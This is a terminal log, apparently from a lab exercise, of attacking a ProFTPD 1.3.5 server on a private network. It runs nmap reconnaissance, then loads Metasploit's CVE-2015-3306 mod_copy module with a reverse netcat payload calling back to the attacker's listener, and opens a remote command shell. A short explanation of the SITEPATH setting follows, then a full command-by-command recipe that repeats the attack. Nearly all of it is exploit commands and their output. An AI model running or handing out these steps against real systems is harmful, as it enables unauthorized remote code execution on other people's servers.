
──╼ #nmap -p 0- -sV -sS -T4 172.20.33.144
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-11-07 15:19 CST
Nmap scan report for 172.20.33.144
Host is up (0.00056s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     ProFTPD 1.3.5
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
80/tcp open  http    Apache httpd 2.4.62 ((Debian))
MAC Address: 52:54:00:8C:BF:C2 (QEMU virtual NIC)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 23.47 seconds


└──╼ #sudo nmap -sV -p21 -sC -A 172.20.33.144
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-11-07 15:15 CST
Nmap scan report for 172.20.33.144
Host is up (0.00071s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     ProFTPD 1.3.5
MAC Address: 52:54:00:8C:BF:C2 (QEMU virtual NIC)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.8
Network Distance: 1 hop
Service Info: OS: Unix

TRACEROUTE
HOP RTT     ADDRESS
1   0.71 ms 172.20.33.144

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.70 seconds

└──╼ #sudo nmap -sV -p21 -sC -A 172.20.33.144
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-11-07 15:15 CST
Nmap scan report for 172.20.33.144
Host is up (0.00071s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     ProFTPD 1.3.5
MAC Address: 52:54:00:8C:BF:C2 (QEMU virtual NIC)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.8
Network Distance: 1 hop
Service Info: OS: Unix

TRACEROUTE
HOP RTT     ADDRESS
1   0.71 ms 172.20.33.144

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.70 seconds
┌─[root@hackerbox]─[~]


└──╼ #nmap -sV -O -A 172.20.15.163
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-11-08 03:15 CST
Nmap scan report for 172.20.15.163
Host is up (0.00040s latency).
Not shown: 997 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     ProFTPD 1.3.5
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
| ssh-hostkey: 
|   3072 95:30:f3:df:a0:a0:f5:2c:cb:3a:f7:4a:7d:c4:62:d5 (RSA)
|   256 21:d6:55:80:3b:05:0b:b6:f2:f3:0d:07:65:6a:87:41 (ECDSA)
|_  256 6b:5a:cd:21:7f:e0:a5:b2:96:02:18:13:56:db:8c:86 (ED25519)
80/tcp open  http    Apache httpd 2.4.62 ((Debian))
|_http-title: Apache2 Debian Default Page: It works
|_http-server-header: Apache/2.4.62 (Debian)
MAC Address: 52:54:00:03:FF:A6 (QEMU virtual NIC)
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.8
Network Distance: 1 hop
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.40 ms 172.20.15.163

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 21.50 seconds



msf6 > search CVE-2015-3306

Matching Modules
================

   #  Name                                   Disclosure Date  Rank       Check  Description
   -  ----                                   ---------------  ----       -----  -----------
   0  exploit/unix/ftp/proftpd_modcopy_exec  2015-04-22       excellent  Yes    ProFTPD 1.3.5 Mod_Copy Command Execution


Interact with a module by name or index. For example info 0, use 0 or use exploit/unix/ftp/proftpd_modcopy_exec

msf6 > 


msf6 > use exploit/unix/ftp/proftpd_modcopy_exec 
[*] No payload configured, defaulting to cmd/unix/reverse_netcat
msf6 exploit(unix/ftp/proftpd_modcopy_exec) > show options 

Module options (exploit/unix/ftp/proftpd_modcopy_exec):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   CHOST                       no        The local client address
   CPORT                       no        The local client port
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]. Supported proxies: http, sapni, socks4, socks5, socks5h
   RHOSTS                      yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT      80               yes       HTTP port (TCP)
   RPORT_FTP  21               yes       FTP port
   SITEPATH   /var/www         yes       Absolute writable website path
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /                yes       Base path to the website
   TMPPATH    /tmp             yes       Absolute writable path
   VHOST                       no        HTTP server virtual host


Payload options (cmd/unix/reverse_netcat):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  172.20.33.30     yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   ProFTPD 1.3.5



View the full module info with the info, or info -d command.

msf6 exploit(unix/ftp/proftpd_modcopy_exec) > set RHOSTS 172.20.33.144
RHOSTS => 172.20.33.144
msf6 exploit(unix/ftp/proftpd_modcopy_exec) > set SITEPATH /var/www/html
SITEPATH => /var/www/html
msf6 exploit(unix/ftp/proftpd_modcopy_exec) > show options 

Module options (exploit/unix/ftp/proftpd_modcopy_exec):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   CHOST                       no        The local client address
   CPORT                       no        The local client port
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]. Supported proxies: http, sapni, socks4, socks5, socks5h
   RHOSTS     172.20.33.144    yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT      80               yes       HTTP port (TCP)
   RPORT_FTP  21               yes       FTP port
   SITEPATH   /var/www/html    yes       Absolute writable website path
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /                yes       Base path to the website
   TMPPATH    /tmp             yes       Absolute writable path
   VHOST                       no        HTTP server virtual host


Payload options (cmd/unix/reverse_netcat):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  172.20.33.30     yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   ProFTPD 1.3.5



View the full module info with the info, or info -d command.

msf6 exploit(unix/ftp/proftpd_modcopy_exec) > check 
[*] 172.20.33.144:80 - The target appears to be vulnerable. 172.20.33.144:21 - Unauthenticated SITE CPFR command was successful
msf6 exploit(unix/ftp/proftpd_modcopy_exec) > exploit 
[*] Started reverse TCP handler on 172.20.33.30:4444 
[*] 172.20.33.144:80 - 172.20.33.144:21 - Connected to FTP server
[*] 172.20.33.144:80 - 172.20.33.144:21 - Sending copy commands to FTP server
[*] 172.20.33.144:80 - Executing PHP payload /LxGFGnk.php
[+] 172.20.33.144:80 - Deleted /var/www/html/LxGFGnk.php
[*] Command shell session 1 opened (172.20.33.30:4444 -> 172.20.33.144:47356) at 2025-11-07 16:07:36 -0600
[-] 172.20.33.144:80 - Exploit aborted due to failure: unknown: 172.20.33.144:21 - Failure executing payload
[*] Exploit completed, but no session was created.
msf6 exploit(unix/ftp/proftpd_modcopy_exec) > 
msf6 exploit(unix/ftp/proftpd_modcopy_exec) > sessions -l

Active sessions
===============

  Id  Name  Type            Information  Connection
  --  ----  ----            -----------  ----------
  1         shell cmd/unix               172.20.33.30:4444 -> 172.20.33.144:47356 (172.20.33.144)

msf6 exploit(unix/ftp/proftpd_modcopy_exec) > sessions -i 1
[*] Starting interaction with 1...


Important !!!

Why /var/www/html instead of /var/www?
On many Debian/Ubuntu systems, the default web server document root is /var/www/html. /var/www is just the parent directory and typically contains other folders (for example html, vhosts, etc.).
Metasploit writes the PHP stager to the path specified by SITEPATH. For the stager URL (http://host/Name.php) to work, SITEPATH must point exactly to the directory the web server serves (the DocumentRoot).
If the file is placed in the wrong location, it will either be unreachable (404), served as plain text/downloaded rather than executed, or immediately ignored/deleted - and the handler will not receive a connection.



-- Commands Summary --

msfconsole -q
msf6 > search CVE-2015-3306
msf6 > use exploit/unix/ftp/proftpd_modcopy_exec
msf6 exploit(unix/ftp/proftpd_modcopy_exec) > show options
msf6 exploit(unix/ftp/proftpd_modcopy_exec) > set RHOSTS 172.20.33.144
msf6 exploit(unix/ftp/proftpd_modcopy_exec) > set SITEPATH /var/www/html
msf6 exploit(unix/ftp/proftpd_modcopy_exec) > show options
msf6 exploit(unix/ftp/proftpd_modcopy_exec) > check
msf6 exploit(unix/ftp/proftpd_modcopy_exec) > exploit
msf6 exploit(unix/ftp/proftpd_modcopy_exec) > sessions -l
msf6 exploit(unix/ftp/proftpd_modcopy_exec) > sessions -i 1
















